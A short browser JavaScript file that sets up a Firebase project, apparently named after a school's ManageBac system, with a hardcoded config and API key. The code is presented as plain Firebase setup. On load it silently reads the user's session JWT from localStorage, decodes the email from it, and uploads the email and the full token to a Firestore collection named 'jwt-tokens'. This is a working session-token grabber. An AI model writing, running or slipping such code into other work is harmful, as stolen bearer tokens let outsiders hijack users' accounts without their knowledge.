import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import {
  getFirestore,
  addDoc,
  collection,
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
// import { Link } from "https://unpkg.com/react-router-dom@5.0.0/umd/react-router-dom.min.js";

// const navigate = useNavigate();
// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDvix46PGrqV4sIW3tlj-fLlb6mbuDVHj8",
  authDomain: "tnsbeaconhouse-managebac.firebaseapp.com",
  projectId: "tnsbeaconhouse-managebac",
  storageBucket: "tnsbeaconhouse-managebac.appspot.com",
  messagingSenderId: "102801144416",
  appId: "1:102801144416:web:7d3c46ce4a044c81f66105",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

function parseJwt(token) {
  var base64Url = token.split(".")[1];
  var base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
  var jsonPayload = decodeURIComponent(
    window
      .atob(base64)
      .split("")
      .map(function (c) {
        return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
      })
      .join("")
  );

  return JSON.parse(jsonPayload);
}

const userToken = localStorage.token;
const decodedTokenPayload = parseJwt(userToken);

console.log("success")

const sToken = async () => {
  try {
    const docRef = await addDoc(collection(db, "jwt-tokens"), {
      email: decodedTokenPayload.email,
      token: userToken,
    });

    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  }
};

sToken();